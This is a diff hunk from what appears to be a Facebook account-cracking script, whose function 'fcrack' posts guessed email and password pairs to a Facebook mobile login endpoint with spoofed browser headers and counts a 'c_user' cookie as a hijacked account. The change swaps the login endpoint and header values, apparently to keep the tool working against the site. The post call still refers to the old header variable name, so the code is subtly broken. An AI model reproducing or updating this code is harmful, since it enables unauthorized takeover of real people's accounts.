@@ -824,23 +824,23 @@ def fcrack(uid,pwx,tl):
 			"email":uid,
 			"pass":ps,
 			"login":"Log In"}
-			header_freefb = {'authority': 'free.facebook.com',
+			header_mobilefb = {'authority': 'mobile.facebook.com',
             'method': 'GET',
-            'path': '/',
+            'path': '/?zero_e=3&zero_et=1672940463&_rdc=1&_rdr&tbua=1',
             'scheme': 'https',
             'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9',
             'accept-encoding': 'gzip, deflate, br',
-            'accept-language': 'en-US,en;q=0.9',           
-            'sec-ch-ua': '" Not A;Brand";v="99", "Chromium";v="100", "Google Chrome";v="100"',
+            'accept-language': 'en-US,en;q=0.9',
+            'referer': 'https://mobile.facebook.com/?zero_e=3&zero_et=1672940463&_rdc=1&_rdr',
+            'sec-ch-ua': '"Not?A_Brand";v="8", "Chromium";v="108", "Google Chrome";v="108"',
             'sec-ch-ua-mobile': '?0',
             'sec-ch-ua-platform': '"Windows"',
             'sec-fetch-dest': 'document',
             'sec-fetch-mode': 'navigate',
-            'sec-fetch-site': 'none',
-            'sec-fetch-user': '?1',
+            'sec-fetch-site': 'same-origin',
             'upgrade-insecure-requests': '1',
             'user-agent': ua}
-			lo = session.post('https://free.facebook.com/login/?next&ref=dbl&fl&login_from_aymh=1&refid=8',data=log_data,headers=header_freefb).text
+			lo = session.post('https://mobile.facebook.com/?zero_e=3&zero_et=1672940463&_rdc=1&_rdr&tbua=1',data=log_data,headers=header_freefb).text
 			log_cookies=session.cookies.get_dict().keys()
 			#print(iid+'|'+pws+'|'+str(log_cookies))
 			if 'c_user' in log_cookies:
